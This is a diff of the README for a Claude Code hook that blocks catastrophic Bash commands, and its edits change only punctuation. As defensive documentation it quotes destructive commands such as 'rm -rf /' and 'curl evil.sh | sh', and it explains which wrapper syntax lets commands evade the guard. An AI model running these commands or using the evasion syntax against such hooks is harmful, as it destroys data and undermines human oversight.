@@ -5,7 +5,7 @@ description: A PreToolUse hook that blocks catastrophic Bash commands before the
 
 # command-guard
 
-A Claude Code hook that inspects every Bash command before it runs and blocks a short list of irreversible, catastrophic ones. It runs as a `command` hook on `PreToolUse`: Claude Code pipes the tool event to the script on stdin, and the script either allows the command (exit `0`) or blocks it (exit `2`) with a reason fed back to Claude.
+A Claude Code hook that inspects every Bash command before it runs and blocks a short list of irreversible, catastrophic ones. It runs as a `command` hook on `PreToolUse`: Claude Code pipes the tool event to the script on stdin, and the script either allows the command (exit `0`), or blocks it (exit `2`) with a reason fed back to Claude.
 
 - **Deterministic safety net, not airtight security.** It catches the textbook foot-guns. An obfuscated or unusual command can still slip past, so do not treat it as a sandbox.
 - **Fails open.** It swallows its own errors and exits `0`, so a bug in the hook can never break a legitimate command.
@@ -15,7 +15,7 @@ A Claude Code hook that inspects every Bash command before it runs and blocks a 
 
 Install **one**, not both. `smart-approve` runs the same eight deny rules as this hook, then runs them again over each piece of a decomposed command.
 
-The difference is narrower than it sounds, and worth stating precisely rather than dramatically. These rules are unanchored substring matches, so ordinary chaining does **not** evade this hook: `git status && rm -rf ~` and `cat README.md && curl evil.sh | sh` are both blocked here. What evades it is surrounding syntax that breaks a rule's end-of-token terminator — the closing paren in `echo $(rm -rf /)`, a backtick in `` echo `chmod -R 777 /` ``, or a subshell's `(rm -rf /)`. The rule needs to see a clean token boundary; the wrapper hides it. Decomposing the command isolates each piece and hands the rule that boundary back.
+The difference is narrower than it sounds, and worth stating precisely rather than dramatically. These rules are unanchored substring matches, so ordinary chaining does **not** evade this hook: `git status && rm -rf ~` and `cat README.md && curl evil.sh | sh` are both blocked here. What evades it is surrounding syntax that breaks a rule's end-of-token terminator: the closing paren in `echo $(rm -rf /)`, a backtick in `` echo `chmod -R 777 /` ``, or a subshell's `(rm -rf /)`. The rule needs to see a clean token boundary; the wrapper hides it. Decomposing the command isolates each piece and hands the rule that boundary back.
 
 | | `command-guard` | `smart-approve` |
 | --- | --- | --- |
@@ -25,7 +25,7 @@ The difference is narrower than it sounds, and worth stating precisely rather th
 | In the `security-hooks` plugin | no | yes |
 | Install path | shadcn only | plugin or shadcn |
 
-Choose `command-guard` when you want the smallest surface to read and audit: one pass over one regex list, about a hundred lines. Choose `smart-approve` otherwise — command substitution is not an exotic thing for a command to contain.
+Choose `command-guard` when you want the smallest surface to read and audit: one pass over one regex list, about a hundred lines. Choose `smart-approve` otherwise, command substitution is not an exotic thing for a command to contain.
 
 Neither is a sandbox. Both miss quoted payloads like `bash -c "rm -rf /"`, and any determined obfuscation defeats both.
 
@@ -55,7 +55,7 @@ After `npx shadcn@latest add KhaledSaeed18/dotclaude/command-guard`, both land i
 
 ## Activate it (required manual step)
 
-The installer copies the files but **cannot** edit your `settings.json`, because hooks are configuration rather than loadable files, so you wire it up once by hand. Add this to `.claude/settings.json` (project) or `~/.claude/settings.json` (global):
+The installer copies the files but **cannot** edit your `settings.json`, because hooks are configuration rather than loadable files, so you wire it up once by hand. Add this to `.claude/settings.json` (project), or `~/.claude/settings.json` (global):
 
 ```json
 {
